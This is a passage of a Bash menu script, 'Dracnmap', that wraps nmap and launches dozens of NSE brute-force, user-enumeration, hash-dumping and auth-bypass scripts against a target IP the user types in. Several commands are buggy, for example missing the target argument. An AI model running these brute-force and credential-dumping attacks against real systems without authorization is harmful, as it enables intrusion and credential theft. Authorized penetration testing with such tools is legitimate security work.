#!/usr/bin/env bash

#============================================================================================================
#                         Dracnmap for dracos
#
#                      Welcome and dont disclaimer
#              Dracnmap Author By Edo -maland- a.k.a screetsec
#                     Tested On Kali Linux and Dracos
#       contact me in screetsec@gmail.com or screetsec@dracos-linux.org
#          OS Penetration From Indonesia : https://dracos-linux.org/
#============================================================================================================


#This colour
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'


#Variable
Version='2.1'
Codename='Redline'
xterm='xterm -hold -fa monaco -fs 13 -bg black -e nmap'


trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit ..."
sleep 1
echo ""
echo -e $yellow"[*] Thank You For Using Dracnmap  =)."
echo ""
echo -e $yellow"[*] Check Dracos Linux LFS, Penetration OS From Indonesia  =P."
exit
}

#Bebeku
if [[ $EUID -ne 0 ]]; then
	echo "ERROR! Run this script with root user!"
	exit 1
fi

if [ -z "${DISPLAY:-}" ]; then
    echo -e "\e[1;31mThe script should be executed inside a X (graphical) session."$transparent""
    exit 1
fi
resize -s 50 84 > /dev/null

###############################################
# Checking gaannss
###############################################
clear
echo -e $okegreen ""
echo -e $okegreen "    .___                     _______                         $red       ________  ";
echo -e $okegreen "  __| _/___________    ____  \      \   _____ _____  ______  $red ___  _\_____  \ ";
echo -e $okegreen " / __ |\_  __ \__  \ _/ ___\ /   |   \ /     \\__  \ \____  \ $red \  \/ //  ____/  ";
echo -e $okegreen "/ /_/ | |  | \// __ \\  \___/     |    \  Y Y  \/ __ \|  |_> >$red  \   //       \  ";
echo -e $okegreen "\____ | |__|  (____  /\___  >____|__  /__|_|  (____  /   __/ $red/\ \_/ \_______ \ ";
echo -e $okegreen "     \/            \/     \/        \/      \/     \/|__|    $red\/             \/ ";
echo
echo -e $okegreen"-------------------------------------------------------------------------------"
echo -e $lightgreen'-- -- +=[(c) 2016-2017 | dracos-linux.org | Linuxsec.org | Pentester Indonesia '
echo -e $cyan'-- -- +=[ Author: Screetsec < Edo Maland >  ]=+ -- -- '
echo -e " "

if [ $(id -u) != "0" ]; then

      echo [!]::[Check Dependencies] ;
      sleep 2
      echo [✔]::[Check User]: $USER ;
      sleep 1
      echo [x]::[not root]: you need to be [root] to run this script.;
      echo ""
   	  sleep 1
	  exit


else

   echo [!]::[Check Dependencies]: ;
   sleep 1
   echo [✔]::[Check User]: $USER ;

fi

  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then

    echo [✔]::[Internet Connection]: DONE!;
    echo [x]::[warning]: This Script Needs An Active Internet Connection;
    sleep 2

else

    echo [✔]::[Internet Connection]: connected!;
    sleep 2
fi

# check nmap if exists
      which nmap > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo [✔]::[nmap]: installation found!;
else

   echo [x]::[warning]:this script require Nmap ;
   echo ""
   echo [!]::[please wait]: please install .... ;
   apt-get update
   apt-get install nmap
   echo ""
   sleep 2
   exit
fi
sleep 2
# check urxvt if exists
      which xterm > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo [✔]::[xterm]: installation found!;
else

   echo [x]::[warning]:this script require xterm ;
   echo ""
   echo [!]::[please wait]: please install .... ;
   apt-get update
   apt-get install xterm
   echo ""
   sleep 2
   exit
fi
sleep 2







################################################
# OUTPUT FILE
################################################
function scanoutput() {
  echo -e $cyan " "
  clear
  echo "  "
  echo "                "
  echo -e $okegreen"                       /^--^\     /^--^\     /^--^\   $cyan"
  echo -e $okegreen"                       \____/     \____/     \____/   $cyan "
  echo -e $okegreen"                      /      \   /      \   /      \  $cyan"
  echo -e $okegreen"                     |        | |        | |        | $cyan "
  echo -e $okegreen"                      \__  __/   \__  __/   \__  __/  $cyan  MEONG MOEONG "
  echo " |^|^|^|^|^|^|^|^|^|^|^|^\ \^|^|^|^/ /^|^|^|^|^\ \^|^|^|^|^|^|^|^|^|^|^|^| "
  echo " | | | | | | | | | | | | |\ \| | |/ /| | | | | | \ \ | | | | | | | | | | | "
  echo " ########################/ /######\ \###########/ /####################### "
  echo " | | | | | | | | | | | | \/| | | | \/| | | | | |\/ | | | | | | | | | | | | "
  echo " |_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_| "
    echo -e $white " "
    echo -e $white"	[$okegreen"01"$white]$okegreen  OUTPUT SCAN IN XML FORMATS  "
    echo -e $white"	[$okegreen"02"$white]$okegreen  OUTPUT SCAN IN HTML FORMATS "
    echo -e $white"	[$okegreen"03"$white]$okegreen  OUTPUT SCAN IN NORMAL FORMATS  "
    echo -e $white"	[$okegreen"04"$white]$okegreen  OUTPUT SCAN IN GREPABLE FORMATS "
    echo -e $white"	[$okegreen"05"$white]$okegreen  BACK  "
    echo -e " "
    echo -n -e $red'  \033[4mScreetsec@Meoong:\033[0m>> '; tput sgr0 #insert your choice
             read DrS

           if test $DrS == '1'
               then
                 echo
        	 echo -ne $cyan"  Path Location: /Dracnmap/Output/"
                 echo
        	 echo -ne "  Name of Report:"
        	 read namafile
                 echo
                 echo -ne "  What is your IP Target or Host: "
                 read ip
                 echo
                 $xterm -A -O -oX Output/$namafile.xml $ip &
                 firefox Output/$namafile.xml
           elif test $DrS == '2'
        	then
                  echo
            	  echo -ne $cyan"  Path Location: /Dracnmap/Output/"
                  echo
            	  echo -ne "  Name of Report:"
            	  read namafile
                  echo
                  echo -ne "  What is your IP Target or Host: "
                  read ip
                  echo
                  $xterm -A -O -oX Output/$namafile.xml $ip &
        	  xsltproc Output/$namafile.xml -o Output/$namafile.html
        	  firefox Output/$namafile.html
            elif test $DrS == '3'
        	  then
                  echo
                  echo -ne $cyan"  Path Location: /Dracnmap/Output/"
                  echo
                  echo -ne "  Name of Report:"
                  read namafile
                  echo
                  echo -ne "  What is your IP Target or Host: "
                  read ip
                  echo
                  $xterm -F -oN Output/$namafile.txt $ip
                  nano Output/$namafile.txt
             elif test $DrS == '4'
        	  then
                  echo
                  echo -ne $cyan"  Path Location: /Dracnmap/Output/"
                  echo
                  echo -ne "  Name of Report:"
                  read namafile
                  echo
                  echo -ne "  What is your IP Target or Host: "
                  read ip
                  echo
                  $xterm -F -oG Output/$namafile.grep $ip &
                  nano Output/$namafile.grep
              elif test $DrS == '5'
                  then
                	menu
       		  else
       			  	echo -e "  Incorrect Number"
        			fi
        			echo -n -e "  Back to Last Menu? ( Yes / No ) :"
       			read back
       			if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
       					then
       					clear
       					menu
       			elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
       					then
       					scanoutput
       			fi
       }



################################################
# NSE SCRIPT FOR BRUTEFORCE
################################################

function brutense	() {
	clear
	echo "                                                   ";

	    echo -e $white " "
	    echo -e $white"	[$okegreen"01"$white]$cyan  afp-brute  "
	    echo -e $white"	[$okegreen"02"$white]$cyan  ajp-brute "
	    echo -e $white"	[$okegreen"03"$white]$cyan  backorifice-brute  "
	    echo -e $white"	[$okegreen"04"$white]$cyan  cassandra-brute "
	    echo -e $white"	[$okegreen"05"$white]$cyan  cics-enum "
	    echo -e $white"	[$okegreen"06"$white]$cyan  cics-user-enum "
	    echo -e $white"	[$okegreen"07"$white]$cyan  citrix-brute-xml"
	    echo -e $white"	[$okegreen"08"$white]$cyan  cvs-brute  "
	    echo -e $white"	[$okegreen"09"$white]$cyan  cvs-brute-repository "
	    echo -e $white"	[$okegreen"10"$white]$cyan  domcon-brute  "
	    echo -e $white"	[$okegreen"11"$white]$cyan  dpap-enum  "
	    echo -e $white"	[$okegreen"12"$white]$cyan  drda-brute "
	    echo -e $white"	[$okegreen"13"$white]$cyan  ftp-brute  "
	    echo -e $white"	[$okegreen"14"$white]$cyan  http-from-brute "
	    echo -e $white"	[$okegreen"15"$white]$cyan  http-iis-short-name-brute "
	    echo -e $white"	[$okegreen"16"$white]$cyan  http-brute "
	    echo -e $white"	[$okegreen"17"$white]$cyan  http-joomla-brute  "
	    echo -e $white"	[$okegreen"18"$white]$cyan  http-proxy-brute "
	    echo -e $white"	[$okegreen"19"$white]$cyan  http-wordpress-brute "
	    echo -e $white"	[$okegreen"20"$white]$cyan  iax2-brute "
	    echo -e $white"	[$okegreen"21"$white]$cyan  informix-brute "
	    echo -e $white"	[$okegreen"22"$white]$cyan  ipmi-brute "
	    echo -e $white"	[$okegreen"23"$white]$cyan  irc-brute "
	    echo -e $white"	[$okegreen"24"$white]$cyan  irc-sasl-brute "
	    echo -e $white"	[$okegreen"25"$white]$cyan  iscsi-brute "
	    echo -e $white"	[$okegreen"26"$white]$cyan  ldap-brute "
	    echo -e $white"	[$okegreen"27"$white]$cyan  imap-brute "
	    echo -e $white"	[$okegreen"28"$white]$cyan  membase-brute "
	    echo -e $white"	[$okegreen"29"$white]$cyan  mmouse-brute "
	    echo -e $white"	[$okegreen"30"$white]$cyan  mongodb-brute "
	    echo -e $white"	[$okegreen"31"$white]$cyan  ms-sql-brute "
	    echo -e $white"	[$okegreen"32"$white]$cyan  mysql-brute "
	    echo -e $white"	[$okegreen"33"$white]$cyan  mysql-enum "
	    echo -e $white"	[$okegreen"34"$white]$cyan  mongodb-brute"
	    echo -e $white"	[$okegreen"35"$white]$cyan  metasploit-msgrpc-brute "
	    echo -e $white"	[$okegreen"36"$white]$cyan  metasploit-xmlrpc-brute  "
	    echo -e $white"	[$okegreen"37"$white]$cyan  mikrotik-routeros-brute "
	    echo -e $white"	[$okegreen"38"$white]$cyan  nessus-xmlrpc-brute "
	    echo -e $white"	[$okegreen"39"$white]$cyan  netbus-brute "
	    echo -e $white"	[$okegreen"40"$white]$cyan  nexpose-brute "
	    echo -e $white"	[$okegreen"41"$white]$cyan  nje-node-brute "
	    echo -e $white"	[$okegreen"42"$white]$cyan  nje-pass-brute "
	    echo -e $white"	[$okegreen"43"$white]$cyan  nping-brute "
	    echo -e $white"	[$okegreen"44"$white]$cyan  nessus-brute "
	    echo -e $white"	[$okegreen"45"$white]$cyan  omp2-brute "
	    echo -e $white"	[$okegreen"46"$white]$cyan  openvas-otp-brute "
	    echo -e $white"	[$okegreen"47"$white]$cyan  oracle-brute "
	    echo -e $white"	[$okegreen"48"$white]$cyan  oracle-brute-stealth "
	    echo -e $white"	[$okegreen"49"$white]$cyan  oracle-sid-brute "
	    echo -e $white"	[$okegreen"50"$white]$cyan  pcanywhere-brute "
	    echo -e $white"	[$okegreen"51"$white]$cyan  pgsql-brute "
	    echo -e $white"	[$okegreen"52"$white]$cyan  pop3-brute "
	    echo -e $white"	[$okegreen"53"$white]$cyan  redis-brute "
	    echo -e $white"	[$okegreen"54"$white]$cyan  rexec-brute "
	    echo -e $white"	[$okegreen"55"$white]$cyan  rlogin-brute "
	    echo -e $white"	[$okegreen"56"$white]$cyan  rpcap-brute "
	    echo -e $white"	[$okegreen"57"$white]$cyan  rsync-brute "
	    echo -e $white"	[$okegreen"58"$white]$cyan  rtsp-url-brute "
	    echo -e $white"	[$okegreen"59"$white]$cyan  sip-brute "
	    echo -e $white"	[$okegreen"60"$white]$cyan  socks-brute "
	    echo -e $white"	[$okegreen"61"$white]$cyan  svn-brute "
	    echo -e $white"	[$okegreen"62"$white]$cyan  tso-enum "
	    echo -e $white"	[$okegreen"63"$white]$cyan  smb-brute "
	    echo -e $white"	[$okegreen"64"$white]$cyan  smtp-brute  "
	    echo -e $white"	[$okegreen"65"$white]$cyan  snmp-brute "
	    echo -e $white"	[$okegreen"66"$white]$cyan  telnet-brute "
	    echo -e $white"	[$okegreen"67"$white]$cyan  vtam-enum "
	    echo -e $white"	[$okegreen"68"$white]$cyan  vmauthd-brute "
	    echo -e $white"	[$okegreen"69"$white]$cyan  vnc-brute"
	    echo -e $white"	[$okegreen"70"$white]$cyan  xmpp-brute "
	    echo -e $white"	[$okegreen"71"$white]$cyan  Back "
	    echo -e " "
	    echo -n -e $red'  \033[4mScreetsec@nse-brute:\033[0m>> '; tput sgr0 #insert your choice
	      	read Brute
	             if test $Brute == '1'
	          	then
	          		echo
	          		echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	           		read ip
	              echo -ne $okegreen " Open Port on Target or Host:  " ; tput sgr0
	             	read port
								$xterm -p $port --script afp-brute $ip &
	          	elif test $Brute == '2'
	           		then
	           			echo
	           			echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	           			read ip
	                echo -ne $okegreen " Open Port on Target or Host:  " ; tput sgr0
	              	read port
	        				$xterm -p $port $ip --script ajp-brute &
	              elif test $Brute == '3'
	                then
	                echo
	                echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                read ip
	                echo -ne $okegreen " Open Port on Target or Host:  " ; tput sgr0
	                read port
									$xterm -sU --script backorifice-brute $ip --script-args backorifice-brute.ports=$port &
	              elif test $Brute == '4'
	                then
	                echo
	                echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                read ip
	                $xterm -p 9160 $ip --script=cassandra-brute &
	            elif test $Brute == '5'
	                then
	                	echo
	                	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                  read ip
										$xterm --script=cics-enum -p 23 $ip &
	              		elif test $Brute == '6'
	                	then
	                	echo
	                	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                  read ip
										$xterm --script=cics-user-enum -p 23 $ip &
	              elif test $Brute == '7'
	                then
	                	echo
	                	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                  read ip
										echo -ne $okegreen " What Userdb " ; tput sgr0
			  						read userdb
										echo -ne $okegreen " What Passdb " ; tput sgr0
			  						read passdb
										echo -ne $okegreen " What domain " ; tput sgr0
			  						read domain
										$xterm --script=citrix-brute-xml --script-args=userdb=$userdb,passdb=$passdb,ntdomain=$domain -p 80,443,8080 $ip &
	              elif test $Brute == '8'
	                then
	                	echo
	                	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                  read ip
										$xterm -p 2401 --script cvs-brute $ip &
	              elif test $Brute == '9'
	                then
	                	echo
	                	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                  read ip
										$xterm -p 2401 --script cvs-brute-repository $ip &
	              elif test $Brute == '10'
	                then
	                	echo
	                	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                  read ip
										$xterm --script domcon-brute -p 2050 $ip &
	              elif test $Brute == '11'
	                then
	                	echo
	                	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                  read ip
										$xterm --script dpap-brute -p 8770 $ip &
	              elif test $Brute == '12'
	                then
	                	echo
	                	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                  read ip
										$xterm -p 50000 --script drda-brute $ip &
	              elif test $Brute == '13'
	                then
	                	echo
	                	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                  read ip
	                	echo -ne $okegreen " Open Port on Target or Host:  " ; tput sgr0
	                  read port
	                	$xterm --script ftp-brute -p $port $ip &
	              elif test $Brute == '14'
	                then
	                	echo
	                	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                  read ip
				$xterm --script http-form-brute -p 80 $ip &
	          elif test $Brute == '15'
	       			then
	       				echo
	       				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	        		  read ip
								$xterm -p80 --script http-iis-short-name-brute $ip &
	       		elif test $Brute == '16'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
	            	echo -ne $okegreen " Open Port on Target or Host:  " ; tput sgr0
	              read port
	            	$xterm --script http-brute -p $port $ip &
	       		elif test $Brute == '17'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
	            	$xterm -sV --script http-joomla-brute $ip &
	       		elif test $Brute == '18'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
	            	$xterm --script http-proxy-brute -p 8080 $ip &
	       		elif test $Brute == '19'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
	            	$xterm -sV --script http-wordpress-brute $ip &
	       		elif test $Brute == '20'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -sU -p 4569 $ip --script iax2-brute &
	       		elif test $Brute == '21'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script informix-brute -p 9088 $ip &
	       		elif test $Brute == '22'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -sU --script ipmi-brute -p 623 $ip &
	       		elif test $Brute == '23'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script irc-brute -p 6667 $ip &
	       		elif test $Brute == '24'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script irc-sasl-brute -p 6667 $ip &
	       		elif test $Brute == '25'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -sV --script=iscsi-brute $ip &
	       		elif test $Brute == '26'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=cqure,dc=net"' $ip &
	  		elif test $Brute == '27'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 143,993 --script imap-brute $ip &
	  		elif test $Brute == '28'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 11211 --script membase-brute &
	  		elif test $Brute == '29'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script mmouse-brute -p 51010 $ip &
	  		elif test $Brute == '30'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 27017 $ip --script mongodb-brute &
	  		elif test $Brute == '31'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt $ip &
	  		elif test $Brute == '32'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script=mysql-brute $ip
	  		elif test $Brute == '33'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								nmap --script=mysql-enum $ip &
	  		elif test $Brute == '34'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 27017 $ip --script mongodb-brute &
	          elif test $Brute == '35'
	            then
	            	echo
	            	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script metasploit-msgrpc-brute -p 55553 $ip &
	          elif test $Brute == '36'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
	             $xterm --script metasploit-xmlrpc-brute -p 55553 $ip &
	           elif test $Brute == '37'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
	             $xterm -p 8728 --script mikrotik-routeros-brute $ip &
	           elif test $Brute == '38'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -sV --script=nessus-xmlrpc-brute $ip &
	           elif test $Brute == '39'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 12345 --script netbus-brute $ip &
	           elif test $Brute == '40'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script nexpose-brute -p 3780 $ip &
	           elif test $Brute == '41'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -sV --script=nje-node-brute $ip &
	           elif test $Brute == '42'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script=nje-pass-brute --script-args=ohost='POTATO',rhost='CACTUS',sleep=5 -p 175 $ip &
	           elif test $Brute == '43'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 9929 --script nping-brute $ip &
	           elif test $Brute == '44'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
	             	$xterm --script nessus-brute -p 1241 $ip &
	           elif test $Brute == '45'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 9390 --script omp2-brute $ip &
	           elif test $Brute == '46'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -sV --script=openvas-otp-brute $ip &
	           elif test $Brute == '47'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL $ip &
	           elif test $Brute == '48'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL $ip &
	           elif test $Brute == '49'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script=oracle-sid-brute -p 1521-1560 $ip &
	           elif test $Brute == '50'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script=pcanywhere-brute $ip &
	           elif test $Brute == '51'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 5432 --script pgsql-brute $ip &
	           elif test $Brute == '52'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -sV --script=pop3-brute $ip &
	           elif test $Brute == '53'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 6379 $ip --script redis-brute &
	           elif test $Brute == '54'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 512 --script rexec-brute $ip &
	           elif test $Brute == '55'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 513 --script rlogin-brute $ip &
	           elif test $Brute == '56'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 2002 $ip --script rpcap-brute &
	           elif test $Brute == '57'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' $ip &
	           elif test $Brute == '58'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
	             	$xterm --script rtsp-url-brute -p 554 $ip &
	           elif test $Brute == '59'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm -sU -p 5060 $ip --script=sip-brute &
	           elif test $Brute == '60'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script socks-brute -p 1080 $ip &
	           elif test $Brute == '61'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script svn-brute --script-args svn-brute.repo=/svn/ -p 3690 $ip &
	           elif test $Brute == '62'
	             then
	             	echo
	             	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
								$xterm --script=tso-enum -p 23 $ip &
	           elif test $Brute == '63'
	              then
	              echo
	              echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	              read ip
	              $xterm -sU -sS --script smb-brute.nse -p U:137,T:139 &
	            elif test $Brute == '64'
	              then
	              	echo
	              	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                read ip
	              	$xterm -p 25 --script smtp-brute $ip &
	            elif test $Brute == '65'
	               then
	               	echo
	               	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                read ip
	               	echo -ne $okegreen " Located Wordlist ? :  " ; tput sgr0
	                read wordlist
	               $xterm -sU --script snmp-brute $ip [--script-args snmp-brute.communitiesdb=$wordlist ]  &
	             elif test $Brute == '66'
	               then
	               	echo
	               	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                read ip
	               	echo -ne $okegreen " Open Port on Target or Host (23):  " ; tput sgr0
	                read port
	               	$xterm -p $port --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s $ip &
	            elif test $Brute == '67'
	              then
	              	echo
	              	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                read ip
									$xterm --script vtam-enum -p 23 $ip &
	            elif test $Brute == '68'
	              then
	              	echo
	              	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                read ip
									$xterm -p 902 $ip --script vmauthd-brute &
	             elif test $Brute == '69'
	               then
	               	echo
	               	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                read ip
	               	$xterm --script vnc-brute -p 5900 $ip &
	             elif test $Brute == '70'
	               then
	               	echo
	               	echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
	                read ip
	               	$xterm -p 5222 --script xmpp-brute $ip &
	             elif test $Brute == '71'
	               then
	                nse
	             else
	                 echo ""
	                 echo -e $okegreen " Incorrect Number"
	               fi
	               		echo ""
	               		echo ""
	               		echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
	             read back
	             if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
	                 then
	                 clear
	                 menu
	             elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
	                 then
	                 brutense
	             fi
}

function auth () {
clear
	echo
	echo
  echo -e $white"	[$okegreen"01"$white]$cyan ajp-auth "
  echo -e $white"	[$okegreen"02"$white]$cyan creds-summary	"
  echo -e $white"	[$okegreen"03"$white]$cyan domcon-cmd	"
  echo -e $white"	[$okegreen"04"$white]$cyan domino-enum-users	"
  echo -e $white"	[$okegreen"05"$white]$cyan ftp-anon	"
  echo -e $white"	[$okegreen"06"$white]$cyan http-auth	"
  echo -e $white"	[$okegreen"07"$white]$cyan http-barracuda-dir-traversal	"
  echo -e $white"	[$okegreen"08"$white]$cyan http-config-backup	"
  echo -e $white"	[$okegreen"09"$white]$cyan http-default-accounts	"
  echo -e $white"	[$okegreen"10"$white]$cyan http-domino-enum-passwords	"
  echo -e $white"	[$okegreen"11"$white]$cyan http-method-tamper	"
  echo -e $white"	[$okegreen"12"$white]$cyan http-userdir-enum	"
  echo -e $white"	[$okegreen"13"$white]$cyan http-vuln-cve2010-0738	"
  echo -e $white"	[$okegreen"14"$white]$cyan http-wordpress-users	"
  echo -e $white"	[$okegreen"15"$white]$cyan informix-query	"
  echo -e $white"	[$okegreen"16"$white]$cyan informix-tables	"
  echo -e $white"	[$okegreen"17"$white]$cyan krb5-enum-users	"
  echo -e $white"	[$okegreen"18"$white]$cyan ms-sql-dump-hashes"
  echo -e $white"	[$okegreen"19"$white]$cyan ms-sql-empty-password	"
  echo -e $white"	[$okegreen"20"$white]$cyan ms-sql-hasdbaccess	"
  echo -e $white"	[$okegreen"21"$white]$cyan mysql-dump-hashes	"
  echo -e $white"	[$okegreen"22"$white]$cyan mysql-empty-password	"
  echo -e $white"	[$okegreen"23"$white]$cyan mysql-query	"
  echo -e $white"	[$okegreen"24"$white]$cyan mysql-users	"
  echo -e $white"	[$okegreen"25"$white]$cyan ncp-enum-users	"
  echo -e $white"	[$okegreen"26"$white]$cyan netbus-auth-bypass	"
  echo -e $white"	[$okegreen"27"$white]$cyan oracle-enum-users	"
  echo -e $white"	[$okegreen"28"$white]$cyan realvnc-auth-bypass	"
  echo -e $white"	[$okegreen"29"$white]$cyan sip-enum-users	"
  echo -e $white"	[$okegreen"30"$white]$cyan smb-enum-users	"
  echo -e $white"	[$okegreen"31"$white]$cyan smtp-enum-users	"
  echo -e $white"	[$okegreen"32"$white]$cyan snmp-win32-users	"
  echo -e $white"	[$okegreen"33"$white]$cyan x11-access	"
  echo -e $white"	[$okegreen"34"$white]$cyan Back "
  echo -e " "
  echo -n -e $red'  \033[4mScreetsec@nse-auth:\033[0m>> '; tput sgr0 #insert your choice
           read win
        if test $win == '1'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p 8009 $ip --script ajp-auth [--script-args ajp-auth.path=/login] &
        elif test $win == '2'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV -sC $ip &
        elif test $win == '3'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          echo -ne $okegreen " What is your cmd user: " ; tput sgr0
          read user
          echo -ne $okegreen " What is your cmd pass: " ; tput sgr0
          read pass
